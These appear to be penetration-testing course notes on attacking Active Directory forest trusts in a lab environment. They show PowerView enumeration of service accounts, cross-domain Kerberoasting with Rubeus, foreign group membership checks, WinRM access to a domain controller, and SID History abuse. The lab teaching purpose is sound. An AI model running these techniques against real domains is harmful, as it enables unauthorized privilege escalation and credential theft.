## Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.

### Enumerating Accounts for Associated SPNs Using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

If an account with SPN is from the Domain Admins group in the target domain, we'd have full admin rights to the target domain, with Kerberoasting and cracking the hash.

### Enumerating the Service Account
```powershell-session
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

### Performing a Kerberoasting Attacking with Rubeus using /domain Flag
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

Now we can attempt to crack the hash.

## Admin Password Re-Use & Group Membership

From time to time, bidirectional forest trust is managed by admins from the same company. If we compromise domain A and obtain clear text passwords of privileged account, and domain B has highly privileged account with the same or similar name, then it is worth checking for password reuse across the two forests.

We may also see users or admins from domain A as members of group in domain B. Only `Domain Local Groups` allow security principles from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship.

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) to enumerate groups with users that don't belong to the domain, also known as `foreign group membership`.

### Using Get-DomainForeignGroupMember
```powershell-session
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

The above command output shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

### Accessing DC03 Using Enter-PSSession
```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## SID History Abuse - Cross Forest

SID History can also be abused across forest trust. If a user is migrated from one forest to another and SID filtering isn't enabled, it becomes possible to add SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. We can see an example below, if jjones had administrative access in the inlanefreight domain he will have it now too.

![[sid-history.png]]
